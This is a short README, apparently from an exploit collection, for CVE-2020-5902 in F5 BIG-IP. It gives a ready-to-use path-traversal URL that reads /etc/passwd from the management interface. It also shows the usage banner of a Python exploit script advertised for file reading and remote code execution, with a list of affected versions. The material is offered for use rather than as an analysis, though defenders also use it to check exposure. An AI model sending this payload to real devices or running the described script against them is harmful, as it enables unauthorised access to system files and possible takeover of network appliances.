## Readme

<details>
<summary>CVE-2020-5902 任意文件读取：</summary>

```
https://IP:8443/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
```


```
+-------------------------------------------------------------+
+ DES: by zhzyker as https://github.com/zhzyker/exphub        +
+      CVE-2020-5902 F5 BIG-IP Read File + RCE                +
+-------------------------------------------------------------+
+ USE: python3 <filename> <url>                               +
+ EXP: python3 cve-2020-5902_file.py https://1.1.1.1:8443     +
+ VER: BIG-IP 15.x: 15.1.0/15.0.0                             +
+      BIG-IP 14.x: 14.1.0 ~ 14.1.2                           +
+      BIG-IP 13.x: 13.1.0 ~ 13.1.3                           +
+      BIG-IP 12.x: 12.1.0 ~ 12.1.5                           +
+      BIG-IP 11.x: 11.6.1 ~ 11.6.5                           +
+-------------------------------------------------------------+
```

![images](https://github.com/zhzyker/exphub/blob/master/f5/image/20200708_2.png)

</details>
